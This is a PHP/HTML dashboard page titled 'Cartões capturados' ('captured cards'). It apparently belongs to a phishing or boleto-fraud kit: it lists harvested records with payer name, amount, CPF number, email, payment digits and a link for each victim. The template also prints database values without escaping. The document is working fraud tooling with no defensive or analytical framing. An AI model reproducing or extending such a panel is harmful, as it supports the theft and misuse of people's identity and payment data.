
<div class="row bg-title">
    <div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">
        <h4 class="page-title">Dashboard</h4> </div>
    <div class="col-lg-9 col-sm-8 col-md-8 col-xs-12">
        <ol class="breadcrumb">
            <li><a href="#">Cartões capturados</a></li>
        </ol>
    </div>
    <!-- /.col-lg-12 -->
</div>
<!-- ============================================================== -->
<!-- table -->
<!-- ============================================================== -->
<div class="row">
    <div class="col-md-12 col-lg-12 col-sm-12">
        <div class="white-box">
            <table class="table">
              <thead class="thead-dark">
                <tr>
                  <th scope="col">#</th>
                  <th scope="col">Nome</th>
                  <th scope="col">Valor</th>
                  <th scope="col">CPF</th>
                  <th scope="col">E-mail</th>
                  <th scope="col">Dígitos</th>
                  <th scope="col">Opções</th>
                </tr>
              </thead>
              <tbody>

                <?php
                $count = 1;
                $boleto = query("SELECT * FROM info_boleto");
                while($row_boleto = assoc($boleto)):
                ?>
                <tr>
                  <th scope="row"><?php echo $count++; ?></th>
                  <td><?php echo $row_boleto['pagador']; ?></td>
                  <td><?php echo "R$ ".$row_boleto['valor']; ?></td>
                  <td><?php echo $row_boleto['cpf']; ?></td>
                  <td><?php echo $row_boleto['email']; ?></td>
                  <td><?php echo $row_boleto['digitos']; ?></td>
                  <td><a target="_blank" class="btn btn-info" href="<?php echo $row_boleto['link'];?>">Vizualizar</a></td>
                </tr>
                <?php endwhile; ?>
              </tbody>
            </table>
        </div>
    </div>
</div>